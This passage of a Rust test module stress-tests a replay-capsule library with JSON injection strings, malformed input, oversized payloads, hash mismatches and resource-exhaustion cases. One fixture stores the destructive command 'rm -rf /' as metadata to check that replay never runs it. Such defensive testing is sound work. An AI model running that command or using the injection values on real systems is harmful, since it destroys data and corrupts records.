                expected_outputs: large_outputs,
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            assert_eq!(large_capsule.inputs.len(), 10000);
            assert_eq!(large_capsule.expected_outputs.len(), 10000);
            assert_eq!(large_capsule.inputs[9999].seq, 9999);
        }

        #[test]
        fn test_serialization_injection_and_format_confusion_attacks() {
            // Create a base capsule for testing
            let base_capsule = ReplayCapsule {
                capsule_id: "serialization_test".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: vec![CapsuleInput {
                    seq: 1,
                    data: vec![42],
                    metadata: BTreeMap::new(),
                }],
                expected_outputs: vec![CapsuleOutput {
                    seq: 1,
                    data: vec![42],
                    output_hash: "test_hash".to_string(),
                }],
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "config_hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            // Attack 1: Test canonical JSON serialization
            let json_result = to_canonical_json(&base_capsule);
            assert!(json_result.is_ok(), "Canonical JSON serialization should succeed");

            let json_string = json_result.unwrap();
            assert!(!json_string.is_empty(), "JSON string should not be empty");
            assert!(json_string.contains("serialization_test"), "JSON should contain capsule ID");

            // Attack 2: JSON injection through malicious data
            let mut malicious_metadata = BTreeMap::new();
            malicious_metadata.insert("injection".to_string(), r#"","malicious_field":"injected_value","evil":""#.to_string());

            let injection_capsule = ReplayCapsule {
                capsule_id: r#"test","injected_id":"evil_capsule"#.to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: vec![CapsuleInput {
                    seq: 1,
                    data: r#"{"evil":"payload"}"#.as_bytes().to_vec(),
                    metadata: malicious_metadata,
                }],
                expected_outputs: vec![CapsuleOutput {
                    seq: 1,
                    data: vec![42],
                    output_hash: r#"evil_hash","injected_field":"value"#.to_string(),
                }],
                environment: EnvironmentSnapshot {
                    runtime_version: r#"v1.0.0","injected":"field"#.to_string(),
                    platform: "linux".to_string(),
                    config_hash: "hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            // Should escape malicious content properly
            let malicious_json = to_canonical_json(&injection_capsule);
            assert!(malicious_json.is_ok(), "Should handle malicious content");
            let json_str = malicious_json.unwrap();
            // Malicious content should be properly escaped
            assert!(!json_str.contains(r#""injected_id":"evil_capsule""#), "Should not contain unescaped injection");

            // Attack 3: Malformed JSON parsing attempts
            let malformed_json_tests = vec![
                r#"{"incomplete": json"#,  // Incomplete JSON
                r#"{"capsule_id": null}"#, // Null values
                r#"{"format_version": "not_a_number"}"#, // Wrong type
                r#"{"inputs": "not_an_array"}"#, // Wrong collection type
                r#"{malformed_json_without_quotes}"#, // Invalid syntax
                r#"{"evil": "value", "injection": "attempt"}"#, // Unknown fields
                "", // Empty string
                "not_json_at_all", // Plain text
                r#"{"capsule_id": "🦀_emoji_test"}"#, // Unicode
            ];

            for malformed in malformed_json_tests {
                let parse_result = from_json(malformed);
                // Most should fail gracefully, some might succeed with partial data
                // The key is no crashes or unsafe behavior
                if parse_result.is_ok() {
                    let parsed = parse_result.unwrap();
                    // If parsing succeeded, verify basic structure
                    assert!(!parsed.capsule_id.is_empty() || malformed.contains("capsule_id"));
                }
            }

            // Attack 4: Deeply nested JSON structure attacks
            let mut deep_metadata = BTreeMap::new();
            let nested_json = r#"{"level1":{"level2":{"level3":{"level4":{"level5":"deep_value"}}}}}"#;
            deep_metadata.insert("deep_nesting".to_string(), nested_json.to_string());

            let deep_capsule = ReplayCapsule {
                capsule_id: "deep_structure_test".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: vec![CapsuleInput {
                    seq: 1,
                    data: nested_json.as_bytes().to_vec(),
                    metadata: deep_metadata,
                }],
                expected_outputs: vec![],
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            // Should handle deep structures without stack overflow
            let deep_json_result = to_canonical_json(&deep_capsule);
            assert!(deep_json_result.is_ok(), "Should handle deep structures");

            // Attack 5: Large JSON payload stress testing
            let large_data = vec![0x42; 1_000_000]; // 1MB of data
            let large_capsule = ReplayCapsule {
                capsule_id: "large_payload_test".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: vec![CapsuleInput {
                    seq: 1,
                    data: large_data,
                    metadata: BTreeMap::new(),
                }],
                expected_outputs: vec![],
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            // Should handle large payloads without memory issues
            let large_json_result = to_canonical_json(&large_capsule);
            assert!(large_json_result.is_ok(), "Should handle large payloads");
        }

        #[test]
        fn test_validation_bypass_and_verification_attacks() {
            // Attack 1: Version compatibility bypass attempts
            let version_tests = vec![
                (0, false),  // Version 0 should not be supported
                (MIN_FORMAT_VERSION, true),
                (CURRENT_FORMAT_VERSION, true),
                (CURRENT_FORMAT_VERSION.saturating_add(1), false), // Future version
                (u32::MAX, false), // Maximum version
            ];

            for (version, expected_support) in version_tests {
                let is_supported = is_version_supported(version);
                assert_eq!(is_supported, expected_support, "Version {} support should be {}", version, expected_support);
            }

            // Attack 2: Validation function bypass through malformed structures
            let invalid_capsules = vec![
                // Empty capsule ID
                ReplayCapsule {
                    capsule_id: "".to_string(),
                    format_version: CURRENT_FORMAT_VERSION,
                    inputs: vec![CapsuleInput { seq: 1, data: vec![1], metadata: BTreeMap::new() }],
                    expected_outputs: vec![CapsuleOutput { seq: 1, data: vec![1], output_hash: "h".to_string() }],
                    environment: EnvironmentSnapshot {
                        runtime_version: "v1.0.0".to_string(),
                        platform: "linux".to_string(),
                        config_hash: "hash".to_string(),
                        properties: BTreeMap::new(),
                    },
                },
                // Unsupported version
                ReplayCapsule {
                    capsule_id: "test".to_string(),
                    format_version: 0,
                    inputs: vec![CapsuleInput { seq: 1, data: vec![1], metadata: BTreeMap::new() }],
                    expected_outputs: vec![CapsuleOutput { seq: 1, data: vec![1], output_hash: "h".to_string() }],
                    environment: EnvironmentSnapshot {
                        runtime_version: "v1.0.0".to_string(),
                        platform: "linux".to_string(),
                        config_hash: "hash".to_string(),
                        properties: BTreeMap::new(),
                    },
                },
            ];

            for capsule in invalid_capsules {
                let validation_result = validate_capsule(&capsule);
                // Most invalid capsules should fail validation
                assert!(validation_result.is_err() || capsule.capsule_id.is_empty(),
                       "Invalid capsules should fail validation");
            }

            // Attack 3: Replay function attack through malicious capsules
            let malicious_replay_capsule = ReplayCapsule {
                capsule_id: "malicious_replay".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: vec![
                    CapsuleInput {
                        seq: 1,
                        data: "malicious_command".as_bytes().to_vec(),
                        metadata: {
                            let mut meta = BTreeMap::new();
                            meta.insert("command".to_string(), "rm -rf /".to_string());
                            meta
                        },
                    },
                ],
                expected_outputs: vec![CapsuleOutput {
                    seq: 1,
                    data: "malicious_output".as_bytes().to_vec(),
                    output_hash: "fake_hash".to_string(),
                }],
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            // Should handle malicious replay attempts safely
            let replay_result = replay(&malicious_replay_capsule);
            // May succeed or fail, but should not execute malicious commands
            if replay_result.is_ok() {
                let hash = replay_result.unwrap();
                assert!(!hash.is_empty(), "Replay hash should not be empty if successful");
            }

            // Attack 4: Verification bypass through hash manipulation
            let verification_capsule = ReplayCapsule {
                capsule_id: "verification_test".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: vec![CapsuleInput {
                    seq: 1,
                    data: "test_data".as_bytes().to_vec(),
                    metadata: BTreeMap::new(),
                }],
                expected_outputs: vec![CapsuleOutput {
                    seq: 1,
                    data: "different_data".as_bytes().to_vec(), // Mismatched data
                    output_hash: "intentionally_wrong_hash".to_string(),
                }],
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            let verify_result = replay_and_verify(&verification_capsule);
            // Should detect hash mismatches
            if verify_result.is_ok() {
                let verification_passed = verify_result.unwrap();
                // With mismatched data/hash, verification should likely fail
                assert!(!verification_passed || verification_capsule.expected_outputs.is_empty(),
                       "Verification should fail with mismatched data");
            }

            // Attack 5: Resource exhaustion through complex validation
            let mut complex_inputs = Vec::new();
            let mut complex_outputs = Vec::new();

            for i in 0..1000 {
                complex_inputs.push(CapsuleInput {
                    seq: i,
                    data: vec![i as u8; 1000], // Large data per input
                    metadata: {
                        let mut meta = BTreeMap::new();
                        for j in 0..100 {
                            meta.insert(format!("key_{}_{}", i, j), format!("value_{}_{}", i, j));
                        }
                        meta
                    },
                });

                complex_outputs.push(CapsuleOutput {
                    seq: i,
                    data: vec![(i + 1) as u8; 1000],
                    output_hash: format!("hash_{}", i),
                });
            }

            let complex_capsule = ReplayCapsule {
                capsule_id: "resource_exhaustion_test".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: complex_inputs,
                expected_outputs: complex_outputs,
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            // Should handle complex capsules without resource exhaustion
            let complex_validation = validate_capsule(&complex_capsule);
            assert!(complex_validation.is_ok() || complex_validation.is_err(),
                   "Complex validation should complete without crashing");
        }

        #[test]
        fn test_concurrent_access_and_race_condition_attacks() {
            // Attack 1: Concurrent capsule modification simulation
            let base_capsule = ReplayCapsule {
                capsule_id: "concurrent_test".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: vec![CapsuleInput {
                    seq: 1,
                    data: vec![1, 2, 3],
                    metadata: BTreeMap::new(),
                }],
                expected_outputs: vec![CapsuleOutput {
                    seq: 1,
                    data: vec![1, 2, 3],
                    output_hash: hex::encode(Sha256::digest(&[1, 2, 3])),
                }],
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "hash123".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            // Simulate concurrent operations
            let mut modified_capsules = Vec::new();
            for i in 0..100 {
                let mut capsule = base_capsule.clone();

                // Simulate concurrent modifications
                capsule.capsule_id = format!("concurrent_{}_{}", i, i % 10);
                capsule.format_version = CURRENT_FORMAT_VERSION.saturating_add((i % 2) as u32);

                if i % 3 == 0 {
                    capsule.inputs.push(CapsuleInput {
                        seq: (i + 2) as u64,
                        data: vec![i as u8],
                        metadata: BTreeMap::new(),
                    });
                }

                if i % 5 == 0 {
                    capsule.expected_outputs.push(CapsuleOutput {
                        seq: (i + 3) as u64,
                        data: vec![(i + 1) as u8],
                        output_hash: format!("hash_{}", i),
                    });
                }

                modified_capsules.push(capsule);
            }

            // Verify all modifications were preserved
            assert_eq!(modified_capsules.len(), 100);
            for (i, capsule) in modified_capsules.iter().enumerate() {
                assert!(capsule.capsule_id.contains(&i.to_string()));

                if i % 3 == 0 {
                    assert!(capsule.inputs.len() >= 2, "Should have additional input for iteration {}", i);
                }

                if i % 5 == 0 {
                    assert!(capsule.expected_outputs.len() >= 2, "Should have additional output for iteration {}", i);
                }
            }

            // Attack 2: Rapid serialization/deserialization cycles
            for i in 0..50 {
                let cycle_capsule = ReplayCapsule {
                    capsule_id: format!("cycle_test_{}", i),
                    format_version: CURRENT_FORMAT_VERSION,
                    inputs: vec![CapsuleInput {
                        seq: i as u64,
                        data: vec![i as u8; (i % 100) + 1],
                        metadata: BTreeMap::new(),
                    }],
                    expected_outputs: vec![],
                    environment: EnvironmentSnapshot {
                        runtime_version: format!("v1.{}.{}", i / 10, i % 10),
                        platform: "linux".to_string(),
                        config_hash: format!("hash_{}", i),
                        properties: BTreeMap::new(),
                    },
                };

                // Serialize then deserialize rapidly
                let json_result = to_canonical_json(&cycle_capsule);
                assert!(json_result.is_ok(), "Serialization should succeed for iteration {}", i);

                let json_str = json_result.unwrap();
                let deserialize_result = from_json(&json_str);
                assert!(deserialize_result.is_ok(), "Deserialization should succeed for iteration {}", i);

                let roundtrip_capsule = deserialize_result.unwrap();
                assert_eq!(roundtrip_capsule.capsule_id, cycle_capsule.capsule_id);
                assert_eq!(roundtrip_capsule.format_version, cycle_capsule.format_version);
            }

            // Attack 3: State consistency under rapid validation cycles
            let validation_capsule = ReplayCapsule {
                capsule_id: "validation_stress".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: vec![CapsuleInput {
                    seq: 1,
                    data: b"test_data_for_validation".to_vec(),
                    metadata: BTreeMap::new(),
                }],
                expected_outputs: vec![CapsuleOutput {
                    seq: 1,
                    data: b"test_data_for_validation".to_vec(),
                    output_hash: hex::encode(Sha256::digest(b"test_data_for_validation")),
                }],
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "validation_hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            // Rapid validation cycles
            for i in 0..100 {
                let validation_result = validate_capsule(&validation_capsule);
                assert!(validation_result.is_ok(), "Validation should succeed on iteration {}", i);

                // Interleave with other operations
                if i % 10 == 0 {
                    let _ = to_canonical_json(&validation_capsule);
                }

                if i % 15 == 0 {
                    let _ = replay(&validation_capsule);
                }
            }

            // Verify capsule remained intact after stress testing
            assert_eq!(validation_capsule.capsule_id, "validation_stress");
            assert_eq!(validation_capsule.format_version, CURRENT_FORMAT_VERSION);
            assert_eq!(validation_capsule.inputs.len(), 1);
            assert_eq!(validation_capsule.expected_outputs.len(), 1);
        }
    }
}
